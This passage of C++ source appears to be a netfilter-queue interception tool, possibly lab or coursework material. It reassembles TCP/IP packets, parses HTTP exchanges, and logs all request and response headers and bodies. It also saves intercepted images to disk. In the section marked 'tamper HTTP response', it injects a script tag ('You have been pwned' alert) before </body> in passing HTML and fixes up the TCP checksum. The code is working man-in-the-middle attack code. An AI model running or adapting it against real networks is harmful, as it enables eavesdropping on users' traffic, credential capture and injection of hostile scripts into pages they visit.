    struct sniff_tcp *tcp = (sniff_tcp *)(data + ip_header_length);
    int tcp_header_length = TH_OFF(tcp) * 4;
    int payload_length = ret - ip_header_length - tcp_header_length;
    printf("tcp_header_length=%d ", tcp_header_length);
    printf("tcp_seq_num=%u ", ntohl(tcp->th_seq));
    printf("tcp_s_port=%u ", ntohs(tcp->th_sport));
    printf("tcp_d_port=%u ", ntohs(tcp->th_dport));
    u_char *payload = data + ip_header_length + tcp_header_length;
    printf("Payload data:\n(%.*s)\n\n", payload_length, payload);

    IPDefragmenter::Packet *reassemble =
        IPDefragmenter::defrag((u_char *)ip, ret);

    if (reassemble != nullptr) {
      tcp = (sniff_tcp *)reassemble->data;
      tcp_header_length = get_tcp_header_length(tcp);
      payload_length = reassemble->length - tcp_header_length;
      payload = reassemble->data + tcp_header_length;
      printf("Just IP-Reassembled packet:\n(%.*s)\n\n", payload_length,
             payload);
      std::pair<u_char *, bool> tcp_dedup = TCPStreamer::process_packet(
          (sniff_tcp *)reassemble->data, ip, reassemble->length);
      if (tcp_dedup.second) {
        printf("Reassembled has TCP ended\n");
      }
      if (tcp_dedup.first) {
        printf("Reassembled TCP payload:\n(%.*s)\n\n", payload_length,
               tcp_dedup.first);

        HTTPParser::HTTPReqRes *http_msg =
            HTTPParser::process_bytes(ip, tcp, tcp_dedup.first, payload_length);

        if (http_msg) {
          printf("Reassembled HTTP req-res cycle.\n");
          fprintf(HTTPParser::log, "HTTP %s Request to %s\n",
                  http_msg->request_method.data(),
                  http_msg->request_url.data());
          fprintf(HTTPParser::log, "Request headers:\n");

          for (auto &&header : http_msg->request_headers) {
            fprintf(HTTPParser::log, "%s: %s\n", header.first.data(),
                    header.second.data());
          }

          fprintf(HTTPParser::log, "\n");

          fprintf(HTTPParser::log, "Request body:\n");

          fprintf(HTTPParser::log, "%.*s\n\n", http_msg->request_body_length,
                  http_msg->request_body);

          fprintf(HTTPParser::log, "HTTP Response\n");
          fprintf(HTTPParser::log, "Response status: %d\n",
                  http_msg->response_status);
          fprintf(HTTPParser::log, "Response headers:\n");

          for (auto &&header : http_msg->response_headers) {
            fprintf(HTTPParser::log, "%s: %s\n", header.first.data(),
                    header.second.data());
          }

          fprintf(HTTPParser::log, "\n");

          bool is_png =
              http_msg->response_headers["Content-Type"] == "image/png";
          bool is_jpeg =
              http_msg->response_headers["Content-Type"] == "image/jpeg";
          bool is_image = is_png || is_jpeg;
          if (is_image) {
            auto filename = "data/images/" + http_msg->request_url + "/" +
                            std::to_string(std::chrono::system_clock::now()
                                               .time_since_epoch()
                                               .count()) +
                            (is_png ? ".png" : ".jpeg");
            auto file = fopen(filename.data(), "wb");
            for (int i = 0; i < http_msg->response_body_length; i++) {
              fprintf(file, "%c", http_msg->response_body[i]);
            }

            fclose(file);
          }

          fprintf(HTTPParser::log, "Response body:\n");

          fprintf(HTTPParser::log, "%.*s\n\n", http_msg->response_body_length,
                  http_msg->response_body);

          fflush(HTTPParser::log);

          // tamper HTTP response
          if ((http_msg->response_headers["Content-Type"] == "text/html" ||
               true) &&
              http_msg->response_headers.count("Content-Encoding") == 0) {
            // recover original packet data for tampering
            struct sniff_tcp *tcp = (sniff_tcp *)(data + ip_header_length);
            int tcp_header_length = TH_OFF(tcp) * 4;
            int payload_length = ret - ip_header_length - tcp_header_length;
            // printf("tcp_header_length=%d ", tcp_header_length);
            // printf("tcp_seq_num=%u ", ntohl(tcp->th_seq));
            // printf("tcp_s_port=%u ", ntohs(tcp->th_sport));
            // printf("tcp_d_port=%u ", ntohs(tcp->th_dport));
            u_char *payload = data + ip_header_length + tcp_header_length;
            // printf("Payload data:\n(%.*s)\n\n", payload_length, payload);

            u_char *script =
                (u_char
                     *)"</script>/><script>alert(\"You have been pwned\")</script>";
            int script_length = 56;  // not counting terminator

            // search for </body> in the payload. We will insert the script
            // right before it
            int body_end_index = -1;
            for (size_t i = 0;
                 i <
                 payload_length - (sizeof("</body>") - 1 /*discount \0*/) + 1;
                 i++) {
              if (prefix_match(payload + i, "</body>")) {
                body_end_index = i;
                break;
              }
            }

            // payload copy to facilitate tcp checksum recalculation
            u_char *payload_copy = new u_char[payload_length];
            memcpy(payload_copy, payload, payload_length);

            printf("Characteristic Payload data:\n(%.*s)\n\n", payload_length,
                   payload);

            // if we found the end of body and there is space for the script tag
            if (body_end_index != -1 && body_end_index >= script_length) {
              for (size_t i = 0; i < script_length; i++) {
                payload[body_end_index - 1 - i] = script[script_length - i - 1];
              }

              printf("Found sufficient payload for tampering\n");

              // recalculate TCP checksum
              u_short check = ~tcp->th_sum;
              u_short *payload_halfwords = (u_short *)payload;
              u_short *payload_copy_halfwords = (u_short *)payload_copy;
              for (size_t i = 0; i < (payload_length >> 1); i++) {
                if (payload_halfwords[i] != payload_copy_halfwords[i]) {
                  // check = ~(~check + ~payload_copy_halfwords[i] +
                  //           payload_halfwords[i]);
                  if (check < payload_copy_halfwords[i]) {
                    check--;
                    check -= payload_copy_halfwords[i];
                  } else {
                    check -= payload_copy_halfwords[i];
                  }

                  auto oldcheck = check;
                  check += payload_halfwords[i];
                  if (check < oldcheck) {
                    check++;
                  }
                }
              }
              if (payload_length % 2 != 0) {
                u_short old_padded_short =
                    (((u_short)payload_copy[payload_length - 1]) << 8);
                u_short padded_short =
                    (((u_short)payload[payload_length - 1]) << 8);

                if (check < old_padded_short) {
                  check--;
                  check -= old_padded_short;
                } else {
                  check -= old_padded_short;
                }

                auto oldcheck = check;
                check += padded_short;
                if (check < oldcheck) {
                  check++;
                }
              }
              tcp->th_sum = ~check;

              printf(
                  "Characteristic Payload data after modification:\n(%.*s)\n\n",
                  payload_length, payload);

              verdict->new_data = data;
              verdict->new_data_length = ret;
            }

            delete[] payload_copy;
          }

          delete[] http_msg->request_body;
          delete[] http_msg->response_body;
          delete http_msg;
        }

        delete[] tcp_dedup.first;
      }
      delete[] reassemble->data;
      delete reassemble;
    }
  }
  fputc('\n', stdout);
  if (verdict->new_data_length != 0 && verdict->new_data == nullptr) {
    printf("WRONG !\n");
    exit(1);
  }
}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data) {
  packet_verdict_t verdict;
  verdict.new_data = NULL;
  verdict.new_data_length = 0;
  verdict.verdict = NF_ACCEPT;
  verdict.packet_id = ntohl(nfq_get_msg_packet_hdr(nfa)->packet_id);
  print_pkt(nfa, &verdict);

  printf("entering callback\n");
  return nfq_set_verdict(qh, verdict.packet_id, verdict.verdict,
                         verdict.new_data_length, verdict.new_data);
}

int main(int argc, char **argv) {
  struct nfq_handle *h;
  struct nfq_q_handle *qh;
  int fd;
  int rv;
  char buf[4096] __attribute__((aligned));

  printf("opening library handle\n");
  h = nfq_open();
  if (!h) {
    fprintf(stderr, "error during nfq_open()\n");
    exit(1);
  }

  printf("unbinding existing nf_queue handler for AF_INET (if any)\n");
  if (nfq_unbind_pf(h, AF_INET) < 0) {
    fprintf(stderr, "error during nfq_unbind_pf()\n");
    perror("");
    exit(1);
  }

  printf("binding nfnetlink_queue as nf_queue handler for AF_INET\n");
  if (nfq_bind_pf(h, AF_INET) < 0) {
    fprintf(stderr, "error during nfq_bind_pf()\n");
    exit(1);
  }

  printf("binding this socket to queue '0'\n");
  qh = nfq_create_queue(h, 0, &cb, NULL);
  if (!qh) {
    fprintf(stderr, "error during nfq_create_queue()\n");
    exit(1);
  }

  printf("setting copy_packet mode\n");
  if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
    fprintf(stderr, "can't set packet_copy mode\n");
    exit(1);
  }

  fd = nfq_fd(h);

  while ((rv = recv(fd, buf, sizeof(buf), 0))) {
    printf("pkt received\n");
    nfq_handle_packet(h, buf, rv);
  }

  printf("unbinding from queue 0\n");
  nfq_destroy_queue(qh);

#ifdef INSANE
  /* normally, applications SHOULD NOT issue this command, since
   * it detaches other programs/sockets from AF_INET, too ! */
  printf("unbinding from AF_INET\n");
  nfq_unbind_pf(h, AF_INET);
#endif

  printf("closing library handle\n");
  nfq_close(h);

  exit(0);
}